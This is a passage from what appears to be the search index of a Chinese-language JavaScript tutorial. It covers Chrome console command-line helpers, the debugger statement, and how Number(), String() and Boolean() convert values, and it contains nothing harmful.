\u4ee3\u8868\u5012\u6570\u7b2c\u4e8c\u4e2a\uff0c\u4ee5\u6b64\u7c7b\u63a8\u76f4\u5230 $4 \u3002 \uff083\uff09 $(selector) $(selector) \u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5143\u7d20\uff0c\u7b49\u540c\u4e8e document.querySelector() \u3002\u6ce8\u610f\uff0c\u5982\u679c\u9875\u9762\u811a\u672c\u5bf9 $ \u6709\u5b9a\u4e49\uff0c\u5219\u4f1a\u8986\u76d6\u539f\u59cb\u7684\u5b9a\u4e49\u3002\u6bd4\u5982\uff0c\u9875\u9762\u91cc\u9762\u6709 jQuery\uff0c\u63a7\u5236\u53f0\u6267\u884c $(selector) \u5c31\u4f1a\u91c7\u7528 jQuery \u7684\u5b9e\u73b0\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\u3002 \uff084\uff09 $$(selector) $$(selector) \u8fd4\u56de\u9009\u4e2d\u7684 DOM \u5bf9\u8c61\uff0c\u7b49\u540c\u4e8e document.querySelectorAll \u3002 \uff085\uff09 $x(path) $x(path) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u5339\u914d\u7279\u5b9a XPath \u8868\u8fbe\u5f0f\u7684\u6240\u6709 DOM \u5143\u7d20\u3002 1 $x ( \"//p[a]\" ) \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u6240\u6709\u5305\u542b a \u5143\u7d20\u7684 p \u5143\u7d20\u3002 \uff086\uff09 inspect(object) inspect(object) \u65b9\u6cd5\u6253\u5f00\u76f8\u5173\u9762\u677f\uff0c\u5e76\u9009\u4e2d\u76f8\u5e94\u7684\u5143\u7d20\uff0c\u663e\u793a\u5b83\u7684\u7ec6\u8282\u3002DOM \u5143\u7d20\u5728 Elements \u9762\u677f\u4e2d\u663e\u793a\uff0c\u6bd4\u5982 inspect(document) \u4f1a\u5728 Elements \u9762\u677f\u663e\u793a document \u5143\u7d20\u3002JavaScript \u5bf9\u8c61\u5728\u63a7\u5236\u53f0\u9762\u677f Profiles \u9762\u677f\u4e2d\u663e\u793a\uff0c\u6bd4\u5982 inspect(window) \u3002 \uff087\uff09 getEventListeners(object) getEventListeners(object) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684\u6210\u5458\u4e3a object \u767b\u8bb0\u4e86\u56de\u8c03\u51fd\u6570\u7684\u5404\u79cd\u4e8b\u4ef6\uff08\u6bd4\u5982 click \u6216 keydown \uff09\uff0c\u6bcf\u4e2a\u4e8b\u4ef6\u5bf9\u5e94\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u7684\u6210\u5458\u4e3a\u8be5\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 \uff088\uff09 keys(object) \uff0c values(object) keys(object) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b object \u7684\u6240\u6709\u952e\u540d\u3002 values(object) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b object \u7684\u6240\u6709\u952e\u503c\u3002 1 2 3 4 5 6 var o = { 'p1' : 'a' , 'p2' : 'b' }; keys ( o ) // [\"p1\", \"p2\"] values ( o ) // [\"a\", \"b\"] \uff089\uff09 monitorEvents(object[, events]) \uff0cunmonitorEvents(object[, events]) monitorEvents(object[, events]) \u65b9\u6cd5\u76d1\u542c\u7279\u5b9a\u5bf9\u8c61\u4e0a\u53d1\u751f\u7684\u7279\u5b9a\u4e8b\u4ef6\u3002\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a Event \u5bf9\u8c61\uff0c\u5305\u542b\u8be5\u4e8b\u4ef6\u7684\u76f8\u5173\u4fe1\u606f\u3002 unmonitorEvents \u65b9\u6cd5\u7528\u4e8e\u505c\u6b62\u76d1\u542c\u3002 1 2 monitorEvents ( window , \"resize\" ); monitorEvents ( window , [ \"resize\" , \"scroll\" ]) \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u8868\u793a\u5355\u4e2a\u4e8b\u4ef6\u548c\u591a\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u65b9\u6cd5\u3002 1 2 monitorEvents ( $0 , 'mouse' ); unmonitorEvents ( $0 , 'mousemove' ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u5982\u4f55\u505c\u6b62\u76d1\u542c\u3002 monitorEvents \u5141\u8bb8\u76d1\u542c\u540c\u4e00\u5927\u7c7b\u7684\u4e8b\u4ef6\u3002\u6240\u6709\u4e8b\u4ef6\u53ef\u4ee5\u5206\u6210\u56db\u4e2a\u5927\u7c7b\u3002 mouse\uff1a\"mousedown\", \"mouseup\", \"click\", \"dblclick\", \"mousemove\", \"mouseover\", \"mouseout\", \"mousewheel\" key\uff1a\"keydown\", \"keyup\", \"keypress\", \"textInput\" touch\uff1a\"touchstart\", \"touchmove\", \"touchend\", \"touchcancel\" control\uff1a\"resize\", \"scroll\", \"zoom\", \"focus\", \"blur\", \"select\", \"change\", \"submit\", \"reset\" 1 monitorEvents ( $ ( \"#msg\" ), \"key\" ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u76d1\u542c\u6240\u6709 key \u5927\u7c7b\u7684\u4e8b\u4ef6\u3002 \uff0810\uff09\u5176\u4ed6\u65b9\u6cd5 \u547d\u4ee4\u884c API \u8fd8\u63d0\u4f9b\u4ee5\u4e0b\u65b9\u6cd5\u3002 clear() \uff1a\u6e05\u9664\u63a7\u5236\u53f0\u7684\u5386\u53f2\u3002 copy(object) \uff1a\u590d\u5236\u7279\u5b9a DOM \u5143\u7d20\u5230\u526a\u8d34\u677f\u3002 dir(object) \uff1a\u663e\u793a\u7279\u5b9a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff0c\u662f console.dir \u65b9\u6cd5\u7684\u522b\u540d\u3002 dirxml(object) \uff1a\u663e\u793a\u7279\u5b9a\u5bf9\u8c61\u7684 XML \u5f62\u5f0f\uff0c\u662f console.dirxml \u65b9\u6cd5\u7684\u522b\u540d\u3002","title":"\u63a7\u5236\u53f0\u547d\u4ee4\u884c API"},{"location":"features/console/#debugger","text":"debugger \u8bed\u53e5\u4e3b\u8981\u7528\u4e8e\u9664\u9519\uff0c\u4f5c\u7528\u662f\u8bbe\u7f6e\u65ad\u70b9\u3002\u5982\u679c\u6709\u6b63\u5728\u8fd0\u884c\u7684\u9664\u9519\u5de5\u5177\uff0c\u7a0b\u5e8f\u8fd0\u884c\u5230 debugger \u8bed\u53e5\u65f6\u4f1a\u81ea\u52a8\u505c\u4e0b\u3002\u5982\u679c\u6ca1\u6709\u9664\u9519\u5de5\u5177\uff0c debugger \u8bed\u53e5\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u7ed3\u679c\uff0cJavaScript \u5f15\u64ce\u81ea\u52a8\u8df3\u8fc7\u8fd9\u4e00\u53e5\u3002 Chrome \u6d4f\u89c8\u5668\u4e2d\uff0c\u5f53\u4ee3\u7801\u8fd0\u884c\u5230 debugger \u8bed\u53e5\u65f6\uff0c\u5c31\u4f1a\u6682\u505c\u8fd0\u884c\uff0c\u81ea\u52a8\u6253\u5f00\u811a\u672c\u6e90\u7801\u754c\u9762\u3002 1 2 3 4 for ( var i = 0 ; i < 5 ; i ++ ){ console . log ( i ); if ( i === 2 ) debugger ; } \u4e0a\u9762\u4ee3\u7801\u6253\u5370\u51fa0\uff0c1\uff0c2\u4ee5\u540e\uff0c\u5c31\u4f1a\u6682\u505c\uff0c\u81ea\u52a8\u6253\u5f00\u6e90\u7801\u754c\u9762\uff0c\u7b49\u5f85\u8fdb\u4e00\u6b65\u5904\u7406\u3002","title":"debugger \u8bed\u53e5"},{"location":"features/console/#_1","text":"Chrome Developer Tools, Using the Console Matt West, Mastering The Developer Tools Console Firebug Wiki, Console API Axel Rauschmayer, The JavaScript console API Marius Schulz, Advanced JavaScript Debugging with console.table() Google Developer, Command Line API Reference","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"features/conversion/","text":"\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362 \u00b6 \u6982\u8ff0 \u00b6 JavaScript \u662f\u4e00\u79cd\u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff0c\u53d8\u91cf\u6ca1\u6709\u7c7b\u578b\u9650\u5236\uff0c\u53ef\u4ee5\u968f\u65f6\u8d4b\u4e88\u4efb\u610f\u503c\u3002 1 var x = y ? 1 : 'a' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf x \u5230\u5e95\u662f\u6570\u503c\u8fd8\u662f\u5b57\u7b26\u4e32\uff0c\u53d6\u51b3\u4e8e\u53e6\u4e00\u4e2a\u53d8\u91cf y \u7684\u503c\u3002 y \u4e3a true \u65f6\uff0c x \u662f\u4e00\u4e2a\u6570\u503c\uff1b y \u4e3a false \u65f6\uff0c x \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u8fd9\u610f\u5473\u7740\uff0c x \u7684\u7c7b\u578b\u6ca1\u6cd5\u5728\u7f16\u8bd1\u9636\u6bb5\u5c31\u77e5\u9053\uff0c\u5fc5\u987b\u7b49\u5230\u8fd0\u884c\u65f6\u624d\u80fd\u77e5\u9053\u3002 \u867d\u7136\u53d8\u91cf\u7684\u6570\u636e\u7c7b\u578b\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u4f46\u662f\u5404\u79cd\u8fd0\u7b97\u7b26\u5bf9\u6570\u636e\u7c7b\u578b\u662f\u6709\u8981\u6c42\u7684\u3002\u5982\u679c\u8fd0\u7b97\u7b26\u53d1\u73b0\uff0c\u8fd0\u7b97\u5b50\u7684\u7c7b\u578b\u4e0e\u9884\u671f\u4e0d\u7b26\uff0c\u5c31\u4f1a\u81ea\u52a8\u8f6c\u6362\u7c7b\u578b\u3002\u6bd4\u5982\uff0c\u51cf\u6cd5\u8fd0\u7b97\u7b26\u9884\u671f\u5de6\u53f3\u4e24\u4fa7\u7684\u8fd0\u7b97\u5b50\u5e94\u8be5\u662f\u6570\u503c\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5c31\u4f1a\u81ea\u52a8\u5c06\u5b83\u4eec\u8f6c\u4e3a\u6570\u503c\u3002 1 '4' - '3' // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u867d\u7136\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u51cf\uff0c\u4f46\u662f\u4f9d\u7136\u4f1a\u5f97\u5230\u7ed3\u679c\u6570\u503c 1 \uff0c\u539f\u56e0\u5c31\u5728\u4e8e JavaScript \u5c06\u8fd0\u7b97\u5b50\u81ea\u52a8\u8f6c\u4e3a\u4e86\u6570\u503c\u3002 \u672c\u7ae0\u8bb2\u89e3\u6570\u636e\u7c7b\u578b\u81ea\u52a8\u8f6c\u6362\u7684\u89c4\u5219\u3002\u5728\u6b64\u4e4b\u524d\uff0c\u5148\u8bb2\u89e3\u5982\u4f55\u624b\u52a8\u5f3a\u5236\u8f6c\u6362\u6570\u636e\u7c7b\u578b\u3002 \u5f3a\u5236\u8f6c\u6362 \u00b6 \u5f3a\u5236\u8f6c\u6362\u4e3b\u8981\u6307\u4f7f\u7528 Number() \u3001 String() \u548c Boolean() \u4e09\u4e2a\u51fd\u6570\uff0c\u624b\u52a8\u5c06\u5404\u79cd\u7c7b\u578b\u7684\u503c\uff0c\u5206\u522b\u8f6c\u6362\u6210\u6570\u5b57\u3001\u5b57\u7b26\u4e32\u6216\u8005\u5e03\u5c14\u503c\u3002 Number() \u00b6 \u4f7f\u7528 Number \u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u5316\u6210\u6570\u503c\u3002 \u4e0b\u9762\u5206\u6210\u4e24\u79cd\u60c5\u51b5\u8ba8\u8bba\uff0c\u4e00\u79cd\u662f\u53c2\u6570\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u53e6\u4e00\u79cd\u662f\u53c2\u6570\u662f\u5bf9\u8c61\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u539f\u59cb\u7c7b\u578b\u503c\u7684\u8f6c\u6362\u89c4\u5219\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // \u6570\u503c\uff1a\u8f6c\u6362\u540e\u8fd8\u662f\u539f\u6765\u7684\u503c Number ( 324 ) // 324 // \u5b57\u7b26\u4e32\uff1a\u5982\u679c\u53ef\u4ee5\u88ab\u89e3\u6790\u4e3a\u6570\u503c\uff0c\u5219\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684\u6570\u503c Number ( '324' ) // 324 // \u5b57\u7b26\u4e32\uff1a\u5982\u679c\u4e0d\u53ef\u4ee5\u88ab\u89e3\u6790\u4e3a\u6570\u503c\uff0c\u8fd4\u56de NaN Number ( '324abc' ) // NaN // \u7a7a\u5b57\u7b26\u4e32\u8f6c\u4e3a0 Number ( '' ) // 0 // \u5e03\u5c14\u503c\uff1atrue \u8f6c\u6210 1\uff0cfalse \u8f6c\u6210 0 Number ( true ) // 1 Number ( false ) // 0 // undefined\uff1a\u8f6c\u6210 NaN Number ( undefined ) // NaN // null\uff1a\u8f6c\u62100 Number ( null ) // 0 Number \u51fd\u6570\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c\uff0c\u8981\u6bd4 parseInt \u51fd\u6570\u4e25\u683c\u5f88\u591a\u3002\u57fa\u672c\u4e0a\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u5b57\u7b26\u65e0\u6cd5\u8f6c\u6210\u6570\u503c\uff0c\u6574\u4e2a\u5b57\u7b26\u4e32\u5c31\u4f1a\u88ab\u8f6c\u4e3a NaN \u3002 1 2 parseInt ( '42 cats' ) // 42 Number ( '42 cats' ) // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c parseInt \u9010\u4e2a\u89e3\u6790\u5b57\u7b26\uff0c\u800c Number \u51fd\u6570\u6574\u4f53\u8f6c\u6362\u5b57\u7b26\u4e32\u7684\u7c7b\u578b\u3002 \u53e6\u5916\uff0c parseInt \u548c Number \u51fd\u6570\u90fd\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u4e00\u4e2a\u5b57\u7b26\u4e32\u524d\u5bfc\u548c\u540e\u7f00\u7684\u7a7a\u683c\u3002 1 2 parseInt ( '\\t\\v\\r12.34\\n' ) // 12 Number ( '\\t\\v\\r12.34\\n' ) // 12.34 \uff082\uff09\u5bf9\u8c61 \u7b80\u5355\u7684\u89c4\u5219\u662f\uff0c Number \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5bf9\u8c61\u65f6\uff0c\u5c06\u8fd4\u56de NaN \uff0c\u9664\u975e\u662f\u5305\u542b\u5355\u4e2a\u6570\u503c\u7684\u6570\u7ec4\u3002 1 2 3 Number ({ a : 1 }) // NaN Number ([ 1 , 2 , 3 ]) // NaN Number ([ 5 ]) // 5 \u4e4b\u6240\u4ee5\u4f1a\u8fd9\u6837\uff0c\u662f\u56e0\u4e3a Number \u80cc\u540e\u7684\u8f6c\u6362\u89c4\u5219\u6bd4\u8f83\u590d\u6742\u3002 \u7b2c\u4e00\u6b65\uff0c\u8c03\u7528\u5bf9\u8c61\u81ea\u8eab\u7684 valueOf \u65b9\u6cd5\u3002\u5982\u679c\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u76f4\u63a5\u5bf9\u8be5\u503c\u4f7f\u7528 Number \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u540e\u7eed\u6b65\u9aa4\u3002 \u7b2c\u4e8c\u6b65\uff0c\u5982\u679c valueOf \u65b9\u6cd5\u8fd4\u56de\u7684\u8fd8\u662f\u5bf9\u8c61\uff0c\u5219\u6539\u4e3a\u8c03\u7528\u5bf9\u8c61\u81ea\u8eab\u7684 toString \u65b9\u6cd5\u3002\u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u5bf9\u8be5\u503c\u4f7f\u7528 Number \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u540e\u7eed\u6b65\u9aa4\u3002 \u7b2c\u4e09\u6b65\uff0c\u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\uff0c\u5c31\u62a5\u9519\u3002 \u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var obj = { x : 1 }; Number ( obj ) // NaN // \u7b49\u540c\u4e8e if ( typeof obj . valueOf () === 'object' ) { Number ( obj . toString ()); } else { Number ( obj . valueOf ()); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Number \u51fd\u6570\u5c06 obj \u5bf9\u8c61\u8f6c\u4e3a\u6570\u503c\u3002\u80cc\u540e\u53d1\u751f\u4e86\u4e00\u8fde\u4e32\u7684\u64cd\u4f5c\uff0c\u9996\u5148\u8c03\u7528 obj.valueOf \u65b9\u6cd5, \u7ed3\u679c\u8fd4\u56de\u5bf9\u8c61\u672c\u8eab\uff1b\u4e8e\u662f\uff0c\u7ee7\u7eed\u8c03\u7528 obj.toString \u65b9\u6cd5\uff0c\u8fd9\u65f6\u8fd4\u56de\u5b57\u7b26\u4e32 [object Object] \uff0c\u5bf9\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4f7f\u7528 Number \u51fd\u6570\uff0c\u5f97\u5230 NaN \u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u672c\u8eab\uff0c\u6240\u4ee5\u4e00\u822c\u603b\u662f\u4f1a\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u800c toString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u7684\u7c7b\u578b\u5b57\u7b26\u4e32\uff08\u6bd4\u5982 [object Object] \uff09\u3002\u6240\u4ee5\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7ed3\u679c\u3002 1 Number ({}) // NaN \u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u7684\u4e0d\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u7ed3\u679c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { valueOf : function () { return {}; }, toString : function () { return {}; } }; Number ( obj ) // TypeError: Cannot convert object to primitive value \u4e0a\u9762\u4ee3\u7801\u7684 valueOf \u548c toString \u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u5bf9\u8c61\uff0c\u6240\u4ee5\u8f6c\u6210\u6570\u503c\u65f6\u4f1a\u62a5\u9519\u3002 \u4ece\u4e0a\u4f8b\u8fd8\u53ef\u4ee5\u770b\u5230\uff0c valueOf \u548c toString \u65b9\u6cd5\uff0c\u90fd\u662f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Number ({ valueOf : function () { return 2 ; } }) // 2 Number ({ toString : function () { return 3 ; } }) // 3 Number ({ valueOf : function () { return 2 ; }, toString : function () { return 3 ; } }) // 2 \u4e0a\u9762\u4ee3\u7801\u5bf9\u4e09\u4e2a\u5bf9\u8c61\u4f7f\u7528 Number \u51fd\u6570\u3002\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u8fd4\u56de valueOf \u65b9\u6cd5\u7684\u503c\uff0c\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u8fd4\u56de toString \u65b9\u6cd5\u7684\u503c\uff0c\u7b2c\u4e09\u4e2a\u5bf9\u8c61\u8868\u793a valueOf \u65b9\u6cd5\u5148\u4e8e toString \u65b9\u6cd5\u6267\u884c\u3002 String() \u00b6 String \u51fd\u6570\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\uff0c\u8f6c\u6362\u89c4\u5219\u5982\u4e0b\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u6570\u503c \uff1a\u8f6c\u4e3a\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32 \uff1a\u8f6c\u6362\u540e\u8fd8\u662f\u539f\u6765\u7684\u503c\u3002 \u5e03\u5c14\u503c \uff1a true \u8f6c\u4e3a\u5b57\u7b26\u4e32 \"true\" \uff0c false \u8f6c\u4e3a\u5b57\u7b26\u4e32 \"false\" \u3002 undefined \uff1a\u8f6c\u4e3a\u5b57\u7b26\u4e32 \"undefined\" \u3002 null \uff1a\u8f6c\u4e3a\u5b57\u7b26\u4e32 \"null\" \u3002 1 2 3 4 5 String ( 123 ) // \"123\" String ( 'abc' ) // \"abc\" String ( true ) // \"true\" String ( undefined ) // \"undefined\" String ( null ) // \"null\" \uff082\uff09\u5bf9\u8c61 String \u65b9\u6cd5\u7684\u53c2\u6570\u5982\u679c\u662f\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u662f\u6570\u7ec4\uff0c\u8fd4\u56de\u8be5\u6570\u7ec4\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 String ({ a : 1 }) // \"[object Object]\" String ([ 1 , 2 , 3 ]) // \"1,2,3\" String \u65b9\u6cd5\u80cc\u540e\u7684\u8f6c\u6362\u89c4\u5219\uff0c\u4e0e Number \u65b9\u6cd5\u57fa\u672c\u76f8\u540c\uff0c\u53ea\u662f\u4e92\u6362\u4e86 valueOf \u65b9\u6cd5\u548c toString \u65b9\u6cd5\u7684\u6267\u884c\u987a\u5e8f\u3002 \u5148\u8c03\u7528\u5bf9\u8c61\u81ea\u8eab\u7684 toString \u65b9\u6cd5\u3002\u5982\u679c\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u5bf9\u8be5\u503c\u4f7f\u7528 String \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\u3002 \u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\uff0c\u518d\u8c03\u7528\u539f\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u3002\u5982\u679c valueOf \u65b9\u6cd5\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u5bf9\u8be5\u503c\u4f7f\u7528 String \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\u3002 \u5982\u679c valueOf \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\uff0c\u5c31\u62a5\u9519\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 String ({ a : 1 }) // \"[object Object]\" // \u7b49\u540c\u4e8e String ({ a : 1 }. toString ()) // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u5148\u8c03\u7528\u5bf9\u8c61\u7684 toString \u65b9\u6cd5\uff0c\u53d1\u73b0\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32 [object Object] \uff0c\u5c31\u4e0d\u518d\u8c03\u7528 valueOf \u65b9\u6cd5\u4e86\u3002 \u5982\u679c toString \u6cd5\u548c valueOf \u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { valueOf : function () { return {}; }, toString : function () { return {}; } }; String ( obj ) // TypeError: Cannot convert object to primitive value \u4e0b\u9762\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\uff0c\u6539\u53d8\u8fd4\u56de\u503c\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 String ({ toString : function () { return 3 ; } }) // \"3\" String ({ valueOf : function () { return 2 ; } }) // \"[object Object]\" String ({ valueOf : function () { return 2 ; }, toString : function () { return 3 ; } }) // \"3\" \u4e0a\u9762\u4ee3\u7801\u5bf9\u4e09\u4e2a\u5bf9\u8c61\u4f7f\u7528 String \u51fd\u6570\u3002\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u8fd4\u56de toString \u65b9\u6cd5\u7684\u503c\uff08\u6570\u503c3\uff09\uff0c\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u8fd4\u56de\u7684\u8fd8\u662f toString \u65b9\u6cd5\u7684\u503c\uff08 [object Object] \uff09\uff0c\u7b2c\u4e09\u4e2a\u5bf9\u8c61\u8868\u793a toString \u65b9\u6cd5\u5148\u4e8e valueOf \u65b9\u6cd5\u6267\u884c\u3002 Boolean() \u00b6 Boolean() \u51fd\u6570\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002 \u5b83\u7684\u8f6c\u6362\u89c4\u5219\u76f8\u5bf9\u7b80\u5355\uff1a\u9664\u4e86\u4ee5\u4e0b\u4e94\u4e2a\u503c\u7684\u8f6c\u6362\u7ed3\u679c\u4e3a false \uff0c\u5176\u4ed6\u7684\u503c\u5168\u90e8\u4e3a true \u3002 undefined null 0 \uff08\u5305\u542b -0 \u548c +0 \uff09 NaN '' \uff08\u7a7a\u5b57\u7b26\u4e32\uff09 1 2 3 4 5 Boolean ( undefined ) // false Boolean ( null ) // false Boolean ( 0 ) // false Boolean ( NaN ) // false Boolean ( '' ) // false \u5f53\u7136\uff0c true \u548c false \u8fd9\u4e24\u4e2a\u5e03\u5c14\u503c\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002 1 2 Boolean ( true ) // true Boolean ( false ) // false \u6ce8\u610f\uff0c\u6240\u6709\u5bf9\u8c61\uff08\u5305\u62ec\u7a7a\u5bf9\u8c61\uff09\u7684\u8f6c\u6362\u7ed3\u679c\u90fd\u662f true \uff0c\u751a\u81f3\u8fde false \u5bf9\u5e94\u7684\u5e03\u5c14\u5bf9\u8c61 new Boolean(false) \u4e5f\u662f true \uff08\u8be6\u89c1\u300a\u539f\u59cb\u7c7b\u578b\u503c\u7684\u5305\u88c5\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 Boolean ({}) // true Boolean ([]) // true Boolean ( new Boolean ( false )) // true \u6240\u6709\u5bf9\u8c61\u7684\u5e03\u5c14\u503c\u90fd\u662f true \uff0c\u8fd9\u662f\u56e0\u4e3a JavaScript \u8bed\u8a00\u8bbe\u8ba1\u7684\u65f6\u5019\uff0c\u51fa\u4e8e\u6027\u80fd\u7684\u8003\u8651\uff0c\u5982\u679c\u5bf9\u8c61\u9700\u8981\u8ba1\u7b97\u624d\u80fd\u5f97\u5230\u5e03\u5c14\u503c\uff0c\u5bf9\u4e8e obj1 && obj2 \u8fd9\u6837\u7684\u573a\u666f\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u8f83\u591a\u7684\u8ba1\u7b97\u3002\u4e3a\u4e86\u4fdd\u8bc1\u6027\u80fd\uff0c\u5c31\u7edf\u4e00\u89c4\u5b9a\uff0c\u5bf9\u8c61\u7684\u5e03\u5c14\u503c\u4e3a true \u3002 \u81ea\u52a8\u8f6c\u6362 \u00b6 \u4e0b\u9762\u4ecb\u7ecd\u81ea\u52a8\u8f6c\u6362\uff0c\u5b83\u662f\u4ee5\u5f3a\u5236\u8f6c\u6362\u4e3a\u57fa\u7840\u7684\u3002 \u9047\u5230\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5\u65f6\uff0cJavaScript \u4f1a\u81ea\u52a8\u8f6c\u6362\u6570\u636e\u7c7b\u578b\uff0c\u5373\u8f6c\u6362\u662f\u81ea\u52a8\u5b8c\u6210\u7684\uff0c\u7528\u6237\u4e0d\u53ef\u89c1\u3002 \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u4e92\u76f8\u8fd0\u7b97\u3002 1 123 + 'abc' // \"123abc\" \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u5bf9\u975e\u5e03\u5c14\u503c\u7c7b\u578b\u7684\u6570\u636e\u6c42\u5e03\u5c14\u503c\u3002 1 2 3 if ( 'abc' ) { console . log ( 'hello' ) } // \"hello\" \u7b2c\u4e09\u79cd\u60c5\u51b5\uff0c\u5bf9\u975e\u6570\u503c\u7c7b\u578b\u7684\u503c\u4f7f\u7528\u4e00\u5143\u8fd0\u7b97\u7b26\uff08\u5373 + \u548c - \uff09\u3002 1 2 + { foo : 'bar' } // NaN - [ 1 , 2 , 3 ] // NaN \u81ea\u52a8\u8f6c\u6362\u7684\u89c4\u5219\u662f\u8fd9\u6837\u7684\uff1a\u9884\u671f\u4ec0\u4e48\u7c7b\u578b\u7684\u503c\uff0c\u5c31\u8c03\u7528\u8be5\u7c7b\u578b\u7684\u8f6c\u6362\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u67d0\u4e2a\u4f4d\u7f6e\u9884\u671f\u4e3a\u5b57\u7b26\u4e32\uff0c\u5c31\u8c03\u7528 